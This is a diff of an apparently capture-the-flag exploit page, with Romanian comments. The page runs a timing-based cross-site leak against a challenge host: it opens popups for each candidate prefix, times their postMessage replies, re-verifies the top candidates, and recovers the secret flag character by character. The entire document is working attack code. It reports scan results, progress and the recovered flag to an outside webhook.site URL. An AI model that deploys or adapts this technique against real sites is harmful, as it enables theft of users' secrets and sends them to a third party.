@@ -6,11 +6,15 @@
 const TARGET = "https://svfgp.breakable.live/";
 const WEBHOOK = "https://webhook.site/94b9dd09-33f5-41af-b252-d0649bda60af";
 
-// Pune aici ultimul prefix obținut
+// schimbă doar prefixul ăsta după fiecare rundă
 let prefix = "CTF{139";
 
-// Charset redus ca să meargă mai repede
-const CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_}";
+// charset mai larg, ca să nu ratăm simboluri
+const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}*!@#$%^&()-=+[]:;,.?~";
+
+const ROUND_TIMEOUT = 14000;
+const TOP_CANDIDATES = 3;   // păstrăm primii 3 pentru reverificare
+const VERIFY_ROUNDS = 2;    // câte runde extra de confirmare facem
 
 let running = false;
 
@@ -22,86 +26,138 @@ function exfil(msg) {
   }).catch(() => {});
 }
 
-function round() {
+function sleep(ms) {
+  return new Promise(r => setTimeout(r, ms));
+}
+
+function makeProbeUrl(cand) {
+  return (
+    TARGET +
+    "?mode=probe&q=" + encodeURIComponent(cand) +
+    "&sid=" + encodeURIComponent(cand) +
+    "&rid=" + Math.random().toString(16).slice(2)
+  );
+}
+
+async function runBatch(candidates, timeoutMs) {
+  return new Promise((resolve) => {
+    const started = new Map();
+    const finished = [];
+    const wins = [];
+    let done = false;
+
+    function cleanup() {
+      window.removeEventListener("message", onMsg);
+      for (const w of wins) {
+        try { if (w) w.close(); } catch (_) {}
+      }
+    }
+
+    function finish() {
+      if (done) return;
+      done = true;
+      cleanup();
+      finished.sort((a, b) => b.dt - a.dt);
+      resolve(finished);
+    }
+
+    function onMsg(ev) {
+      const d = ev.data || {};
+      if (d.type !== "svfgp-probe-done") return;
+      if (typeof d.sid !== "string") return;
+      if (!started.has(d.sid)) return;
+
+      finished.push({
+        sid: d.sid,
+        dt: performance.now() - started.get(d.sid)
+      });
+
+      if (finished.length === candidates.length) {
+        finish();
+      }
+    }
+
+    window.addEventListener("message", onMsg);
+
+    for (const cand of candidates) {
+      started.set(cand, performance.now());
+      const w = window.open(makeProbeUrl(cand), "_blank", "width=220,height=120");
+      wins.push(w);
+    }
+
+    setTimeout(finish, timeoutMs);
+  });
+}
+
+async function decideNextChar() {
+  const allCandidates = [...CHARSET].map(ch => prefix + ch);
+
+  // prima rundă: toți candidații
+  const first = await runBatch(allCandidates, ROUND_TIMEOUT);
+
+  if (!first.length) {
+    exfil("no-results-for:" + prefix);
+    return null;
+  }
+
+  exfil("scan:" + first.slice(0, 5).map(x => x.sid + ":" + Math.round(x.dt)).join("|"));
+
+  const shortlist = first.slice(0, TOP_CANDIDATES).map(x => x.sid);
+  const score = new Map();
+  for (const sid of shortlist) score.set(sid, 0);
+
+  // reverificare pe primii candidați
+  for (let i = 0; i < VERIFY_ROUNDS; i++) {
+    await sleep(300);
+    const again = await runBatch(shortlist, ROUND_TIMEOUT);
+    if (!again.length) continue;
+    const best = again[0].sid;
+    score.set(best, (score.get(best) || 0) + 1);
+    exfil("verify" + i + ":" + again.map(x => x.sid + ":" + Math.round(x.dt)).join("|"));
+  }
+
+  // alegem după scor; la egalitate, după prima rundă
+  shortlist.sort((a, b) => {
+    const sa = score.get(a) || 0;
+    const sb = score.get(b) || 0;
+    if (sb !== sa) return sb - sa;
+    const ia = first.findIndex(x => x.sid === a);
+    const ib = first.findIndex(x => x.sid === b);
+    return ia - ib;
+  });
+
+  return shortlist[0];
+}
+
+async function main() {
   if (running) return;
   running = true;
 
-  const started = new Map();
-  const finished = [];
-  const wins = [];
-  let decided = false;
+  exfil("start:" + prefix);
 
-  function cleanup() {
-    window.removeEventListener("message", onMsg);
-    for (const w of wins) {
-      try {
-        if (w) w.close();
-      } catch (_) {}
+  try {
+    while (!prefix.endsWith("}")) {
+      const best = await decideNextChar();
+      if (!best) break;
+      prefix = best;
+      exfil("progress:" + prefix);
+      await sleep(400);
     }
-    running = false;
-  }
-
-  function chooseBest() {
-    if (decided) return;
-    decided = true;
-
-    if (!finished.length) {
-      exfil("no-results");
-      cleanup();
-      return;
-    }
-
-    finished.sort((a, b) => b.dt - a.dt);
-    const best = finished[0];
-    prefix = best.sid;
-
-    exfil("progress:" + prefix);
-
-    cleanup();
 
     if (prefix.endsWith("}")) {
       exfil("FLAG:" + prefix);
       document.body.textContent = "DONE: " + prefix;
-      return;
+    } else {
+      document.body.textContent = "STOPPED AT: " + prefix;
+      exfil("stopped:" + prefix);
     }
-
-    setTimeout(round, 400);
+  } catch (e) {
+    exfil("error:" + String(e));
+    document.body.textContent = "ERROR";
   }
 
-  function onMsg(ev) {
-    const d = ev.data || {};
-    if (d.type !== "svfgp-probe-done") return;
-    if (typeof d.sid !== "string") return;
-    if (!started.has(d.sid)) return;
-
-    finished.push({
-      sid: d.sid,
-      dt: performance.now() - started.get(d.sid)
-    });
-
-    if (finished.length === CHARSET.length) {
-      chooseBest();
-    }
-  }
-
-  window.addEventListener("message", onMsg);
-
-  for (const ch of CHARSET) {
-    const cand = prefix + ch;
-    const url =
-      TARGET +
-      "?mode=probe&q=" + encodeURIComponent(cand) +
-      "&sid=" + encodeURIComponent(cand) +
-      "&rid=" + Math.random().toString(16).slice(2);
-
-    started.set(cand, performance.now());
-    const w = window.open(url, "_blank", "width=220,height=120");
-    wins.push(w);
-  }
-
-  setTimeout(chooseBest, 10000);
+  running = false;
 }
 
-exfil("start");
-round();
+main();
 </script>
